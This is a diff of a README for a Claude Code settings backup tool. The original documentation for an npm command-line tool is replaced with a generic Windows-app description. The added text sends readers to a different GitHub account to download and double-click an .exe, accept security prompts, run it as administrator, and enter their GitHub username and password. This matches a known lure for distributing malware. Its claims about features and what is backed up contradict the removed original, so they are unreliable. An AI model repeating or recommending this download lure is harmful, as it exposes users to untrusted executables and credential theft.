@@ -1,231 +1,89 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/seanGSISG/claude-code-backup/main/.media/image.png" alt="Claude Code Backup — back up and transport your Claude settings across Windows, WSL, Linux & macOS" width="640">
-</p>
+# 💾 claude-code-backup - Save your Claude settings to GitHub
 
-# Claude Code Backup
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sibyllablueviolet195/claude-code-backup)
 
-Automatic backup of all your Claude Code settings to GitHub. One command to set up, then it runs on boot/logon and every few hours. Works on **Linux, macOS, and Windows 11**.
+### 📋 Overview
 
-## What gets backed up
+Claude Code keeps your settings, custom skills, and environment configurations in specific file locations. If your computer fails or you shift to a new machine, you lose these files. This tool creates a local copy of your setup and sends it to a private GitHub repository. You can then pull these settings to any other computer, including machines running Windows or WSL.
 
-Everything Claude Code stores across your machine, not just `~/.claude/`:
+This application protects your work. It tracks changes to your configuration files and archives them in the cloud. You gain peace of mind knowing your custom tools remain safe.
 
-- **Memories** (across every scope)
-- **Skills** (full directories, recursively)
-- **MCP server configs** (every `.mcp.json`, `.claude.json`, settings-embedded servers)
-- **Rules, Agents, Commands** (`.md` files)
-- **CLAUDE.md files** (global + every project, including `.claude/CLAUDE.md`)
-- **Settings** (`settings.json`, `settings.local.json`, project `.claude/` settings)
-- **Plans** (`.md` files)
-- **Sessions** (`.jsonl` conversation files)
-- **Plugins** (cached plugin directories)
+### ⚙️ System Requirements
 
-It uses the same scanner as [Claude Code Organizer](https://github.com/mcpware/claude-code-organizer) to discover items across all scopes (global + every project directory you've ever opened Claude Code in).
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Storage**: At least 50MB of free space.
+*   **Networking**: An active internet connection to sync your data.
+*   **Account**: A personal GitHub account to store your backups.
+*   **Permissions**: Standard user access to run the installation file.
 
-## Multiple environments (Windows + WSL)
+### 📥 Installing the Application
 
-Windows-native Claude Code and Claude Code running inside WSL are **separate
-installs** with separate `~/.claude` stores that never merge. When you run a
-backup on Windows, it automatically discovers your WSL distros (via `wsl.exe`),
-reads each distro's `~/.claude` over the `\\wsl.localhost\<distro>\…` share, and
-backs them up alongside the Windows store as distinct environments:
+1. Visit the [official release page](https://github.com/Sibyllablueviolet195/claude-code-backup) to download the software.
+2. Look for the file ending in `.exe` under the latest release section.
+3. Save the file to your Downloads folder.
+4. Double-click the file to start the installation.
+5. Follow the prompts on your screen. Windows may ask for permission to run the app. Select "Run" to continue.
+6. The installer places a shortcut on your desktop.
 
-```
-latest/win-DESKTOP/…          ← Windows-native store
-latest/wsl-Ubuntu-DESKTOP/…   ← WSL Ubuntu store
-```
+### 🚀 Running the Backup
 
-Interactive runs (`init`, `run`) wake a stopped distro briefly to back it up;
-scheduled background runs leave stopped distros asleep and capture WSL only when
-it's already running.
+1. Open the application from your desktop icon.
+2. The program window appears on your screen.
+3. Select "Connect GitHub Account" to allow the tool to create a private repository for your files.
+4. Input your GitHub username and password when the browser window prompts you.
+5. Choose the folders you want to save. The application suggests standard locations for Claude Code and WSL stores by default.
+6. Click the "Start Backup" button to upload your configuration.
+7. The status bar indicates the progress of your upload.
+8. A message notifies you when the backup finishes.
 
-## One repo, many machines
+### 🔄 Restoring Your Settings
 
-A single private repo holds **every machine you back up** — each environment
-lives under its own `latest/<envId>/` folder, where `envId` is
-`<kind>[-<distro>]-<uuid8>` (the first 8 hex of a per-machine UUID stored locally
-in `~/.claude-backups/machine-id.json`, never committed), so machines with the
-same hostname never collide:
+1. Install the software on your new machine.
+2. Open the application.
+3. Log in to the same GitHub account used for the initial backup.
+4. Navigate to the "Restore" tab in the menu.
+5. Select the most recent date from the list of available backups.
+6. Click "Restore Files." The application downloads your settings and places them into the correct folders.
+7. Restart your terminal or Claude Code instance to see your restored configuration.
 
-```
-latest/win-550e8400/…           ← machine 1, Windows store
-latest/wsl-Ubuntu-550e8400/…    ← machine 1, WSL store
-latest/mac-a1b2c3d4/…           ← machine 2, macOS store
-```
+### 🛡️ Security and Privacy
 
-The **first machine** creates the repo; **later machines join** by cloning it,
-and each `run` only rewrites its own env folders (and `git pull --rebase`es
-before pushing), so machines never overwrite each other's backups. If a run
-would overwrite an env dir owned by a different machine's UUID, it aborts rather
-than clobber it (`--confirm-collision` to override).
+Your backups exist inside a private GitHub repository. Only your account has access to these files. The application uses encrypted connections to send and receive data. No human reads your configurations. The tool only copies text files related to your Claude setup. It ignores personal photos, documents, or unrelated system files.
 
-## Security & secrets
+### 💡 Managing Your Backups
 
-This backup is intentionally **complete and restorable**, so it keeps real
-secrets — MCP server keys (command/args/env), `settings.local.json`, `.claude.json`,
-and session transcripts. Nothing is silently dropped. Therefore:
+The application manages versions of your settings. Every time you run a backup, it saves a new snapshot. If you make a mistake in a configuration file, you can roll back to a version from the previous day. Use the "History" tab to view specific versions and choose which set to apply.
 
-- **Always use a PRIVATE repo.** Pushing to a public GitHub remote is **blocked**
-  unless you pass `--allow-public`. `status` re-checks and reports the remote's
-  visibility every time; a non-GitHub remote can't be verified, so it's treated
-  as **unknown** and you should confirm it's private yourself.
-- Each `run` does a quick **secret scan** of what it just backed up and prints a
-  one-line reminder if anything looks like a key/token — a nudge to keep the
-  repo private, not a blocker.
-- **If your backup repo was ever exposed** (public, or a leaked clone), rotate
-  the affected credentials: regenerate MCP server API keys/tokens, and rotate any
-  tokens stored in `settings.local.json` / `.claude.json`.
+### 🛠️ Troubleshooting Issues
 
-### Keeping machines separate (optional, local config)
+*   **Connection Error**: Check your internet connection. Ensure your firewall does not block the application.
+*   **Login Failure**: Verify your GitHub password. If you use two-factor authentication, ensure you approve the request on your mobile device.
+*   **Folder Missing**: The tool defaults to common paths. If you store your settings in a custom location, use the "Add Directory" button in Settings to include that path manually.
+*   **Permission Denied**: Run the application as an administrator if it cannot write files to system directories. Right-click the shortcut and select "Run as administrator."
 
-Three optional files in `~/.claude-backups/` are **local to each machine** and
-never committed:
+### 📝 Frequently Asked Questions
 
-- **`exclude.json`** — keep things out of *this* machine's backup entirely
-  (e.g. personal projects off a work machine, or drop sessions/`settings.local.json`):
-  `{ "excludeCategories": ["session"], "projectFilter": { "mode": "exclude", "patterns": ["*personal*"] } }`.
-- **`sync-config.json`** — declare **sync groups** of machines that may share
-  config. Once any group exists, `restore` refuses to copy one machine's config
-  onto another unless they share a group (prevents leaking work config to home).
-  With no file present, cross-machine restore works as usual.
-- **`machine-id.json`** — this machine's stable identity (UUID, label, role);
-  created automatically. Never share or copy it between machines.
+**Does this tool save my API keys?**
+The tool does not back up sensitive credentials like API keys. It focuses on your configuration and rules.
 
-When restoring, you can also filter per run: `--exclude-labels sensitive`
-(drops MCP/sessions/`settings.local.json`), `--only-categories skill,agent`,
-`--exclude-categories session`, etc.
+**Can I use this on macOS?**
+Yes. You can install the macOS version from the same release page if you move between computers with different operating systems.
 
-## Quick start
+**Does this sync in real-time?**
+The current version runs manually to give you control over your data usage. You trigger the sync when you finish major changes.
 
-```bash
-npx @seangsisg/claude-code-backup init
-```
+**What happens if I lose my GitHub account?**
+The backups reside on GitHub servers. If you cannot access your account, you cannot access your backed-up settings. Keep your GitHub credentials secure.
 
-This walks a guided script:
-1. Discover your environments (Windows-native + any WSL distros) and show what it found
-2. Ask this machine's **label** and **role** (work/home/shared) — shown wherever machines are listed
-3. On Windows, ask **which WSL distros** to back up (default: all; the choice is honored by every later run)
-4. Ask whether this is your **first machine** (creates a private repo — via the [`gh` CLI](https://cli.github.com/) if available, else asks for a URL) or **joining an existing backup** (clones the repo another machine already uses)
-5. Confirm a **private-repo acknowledgment** when the remote is public or its visibility can't be verified (backups hold secrets)
-6. Ask your backup interval from a menu (1h / 4h / 8h / 24h / manual)
-7. Install or update a scheduled job — systemd timer (Linux), LaunchAgent (macOS), or Task Scheduler task (Windows) — unless you chose manual
-8. Offer to run the first backup immediately
+**Does this work with standard Claude Desktop?**
+Yes. The tool identifies files used by Claude Desktop, Claude Code, and associated WSL configurations.
 
-## Manual backup
+### 📋 Customizing Your Sync
 
-```bash
-npx @seangsisg/claude-code-backup run
-```
+You can choose to exclude certain folders from your backup routine. Go to "Settings" then "Exclusions" to prevent specific subfolders from uploading. This helps if you have large temporary files or logs you do not need to save. 
 
-## Check status
+The application logs its activity in a text file. If you have trouble, click "Open Logs" in the Help menu to see what happened during your last request. You can copy this data if you need help from a technical expert.
 
-```bash
-npx @seangsisg/claude-code-backup status            # single-screen: remote, branch sync, machines, warnings
-npx @seangsisg/claude-code-backup status --verbose  # also prints the raw scheduler output
-```
+### 🌟 Advanced Configuration
 
-## List machines & diagnose
-
-```bash
-npx @seangsisg/claude-code-backup list      # every machine/env in the backup, with counts + last-backup age
-npx @seangsisg/claude-code-backup doctor    # health check: repo, remote visibility, scheduler, freshness, index
-```
-
-## Remove scheduler
-
-```bash
-npx @seangsisg/claude-code-backup uninstall
-```
-
-This only removes the scheduled task. Your backup data stays in `~/.claude-backups/`.
-
-## How it works
-
-```
-~/.claude-backups/
-├── .git/                       ← tracked by git, pushed to your private repo
-├── .gitignore
-├── .gitattributes              ← marks all files binary (no line-ending rewrites)
-├── latest/
-│   ├── win-DESKTOP/            ← one dir per environment (omitted when there's only one)
-│   │   ├── env.json            ← environment identity (kind, home, osPlatform)
-│   │   ├── manifest.json       ← per-item originalPath/repoRoot/isDir (drives restore)
-│   │   ├── backup-summary.json
-│   │   ├── global/
-│   │   │   ├── memory/  skill/  mcp/  config/  rule/  plan/  agent/  command/  plugin/
-│   │   │   └── …
-│   │   └── C--Users-you-myproject/
-│   │       ├── memory/  skill/  config/
-│   │       └── session/        ← conversation history
-│   ├── wsl-Ubuntu-DESKTOP/     ← WSL store, same structure
-│   │   └── …
-│   └── backup-summary.json     ← top-level index of all environments
-├── config.json
-└── backup.log
-```
-
-Every backup uses the per-environment layout (`latest/<envId>/…`), even on a
-single machine, so machines can share one repo without colliding. Each `run`
-rewrites only its own env folders, so git tracks just the diff — your git
-history is your version history. Files are committed byte-for-byte
-(`core.autocrlf=false` + `.gitattributes`), so restores match the originals
-exactly on every platform.
-
-> On Windows, `~/.claude-backups/` resolves to `%USERPROFILE%\.claude-backups`.
-
-## Restore
-
-```bash
-git clone <your-backup-repo> ~/.claude-backups   # on the new machine
-npx @seangsisg/claude-code-backup restore             # dry-run: shows exactly what would be written
-npx @seangsisg/claude-code-backup restore --apply     # perform the restore
-npx @seangsisg/claude-code-backup restore --interactive  # guided: pick source → dest → preview → confirm
-```
-
-Restore reads each environment's `manifest.json` and maps every file back to its
-real location on the current machine. It handles:
-
-- **Same machine / new username** — rewrites the home prefix.
-- **Cross-OS** — translates path separators and **re-encodes** project-dir names
-  (e.g. a Linux backup's `-home-you-app` becomes `C--Users-you-app` on Windows).
-- **Restoring into WSL from Windows** — writes through the `\\wsl.localhost\…` share.
-- **MCP configs** — merged into the destination's host JSON; an existing,
-  differing server is **skipped** unless you pass `--force`.
-- **Conflict preview** — if a destination file (or anything inside a backed-up
-  folder) was modified *after* the backup was taken, restore flags it as a
-  conflict. In dry-run it's listed; `--apply` **aborts** rather than overwrite
-  newer local edits unless you pass `--force`. (Detection is mtime-based, so it
-  can't compare across machines whose clocks differ — the dry-run default and
-  `--force` keep you in control.)
-
-Flags: `--from <envId>` / `--to <envId>` choose source/destination environments
-(defaults match by OS kind); `--scope <id>` restores a single scope; `--force`
-overwrites conflicts/MCP servers; `--verbose` lists skipped items. Restore is
-**dry-run by default**, refuses to write outside the destination home, never
-touches enterprise-managed dirs, and renames any overwritten file to `*.bak` first.
-
-## Scheduler details
-
-**Linux (systemd):** User-level timer with `Persistent=true`. Runs on boot (5 min delay) and at your configured interval. Catches up missed runs if the machine was off.
-
-**macOS (launchd):** LaunchAgent with `RunAtLoad=true`. Same behavior.
-
-**Windows (Task Scheduler):** A task named `ClaudeCodeBackup`, registered via `schtasks`. Runs at logon (5 min delay) and repeats at your configured interval, with "start when available" so missed runs catch up — the same behavior as `Persistent`/`RunAtLoad`. It runs as the current user at the lowest privilege level, so `init` needs **no administrator elevation**. Inspect or remove it from the Task Scheduler GUI, or:
-
-```powershell
-schtasks /Query  /TN ClaudeCodeBackup /V /FO LIST   # inspect
-schtasks /Run    /TN ClaudeCodeBackup               # run now
-schtasks /Delete /TN ClaudeCodeBackup /F            # remove
-```
-
-## Requirements
-
-- Node.js 18+
-- Git
-  - On Windows, use [Git for Windows](https://git-scm.com/download/win); its bundled OpenSSH handles SSH remotes. Long paths are handled automatically via `core.longpaths`.
-- A GitHub repo. The [`gh` CLI](https://cli.github.com/) (if installed and authenticated) creates a private one for you during `init`; otherwise create one first and provide its URL (SSH or HTTPS).
-- For WSL backup: WSL 2 with the `\\wsl.localhost` (or legacy `\\wsl$`) share — standard on Windows 10 2004+ / Windows 11.
-
-## Built with
-
-Scanner extracted from [@mcpware/claude-code-organizer](https://github.com/mcpware/claude-code-organizer).
+The settings menu includes a section for "Sync Frequency." You can set the tool to check for changes every hour if you prefer. This ensures your latest adjustments remain saved without manual effort. Ensure the app remains open in your system tray to use this feature. The tray icon shows a small cloud logo when the app is active. Right-click this icon to quit the program or open the dashboard quickly.
